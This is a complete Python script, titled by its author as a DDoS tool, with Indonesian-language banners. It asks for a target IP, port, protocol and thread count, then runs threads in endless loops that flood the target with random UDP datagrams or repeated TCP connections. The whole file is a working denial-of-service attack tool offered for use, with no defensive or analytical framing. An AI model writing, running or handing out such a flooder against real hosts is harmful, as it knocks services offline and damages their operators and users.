#!/usr/bin/env python3
#Code Test GbzHnzz
import random
import socket
import threading

print("~~~ DDOS TOOLS Gabriel Hanz(GbzHnzz) ~~~")
print("~~~ Scripting By GbzHnzz ~~~")
print("~~~ Jan Asal Ddos Ajg ~~~")
ip = str(input(" TARGET (IP):"))
port = int(input(" TARGET (PORT):"))
choice = str(input(" WITH UDP? (Y/N):"))
times = int(input(" SERANGAN YANG DIKIRIM:"))
threads = int(input(" THREADS YANG DIKIRIM:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[Bismillah HeadShot]","[Bismillah HeadShot]","[Bismillah HeadShot]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET BY GbzHnzz, NAPA GA SENENG? BY1 PAN8!!!!")
		except:
			print("[!] ERROR KEK OTAKLU!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("Bismillah HeadShot]","[Bismillah HeadShot]","[Bismillah HeadShot]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET BY GbzHnzz, NAPA GA SENENG? BY1 PAN8!!!!")
		except:
			s.close()
			print("[*] ERROR KEK OTAK LU")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
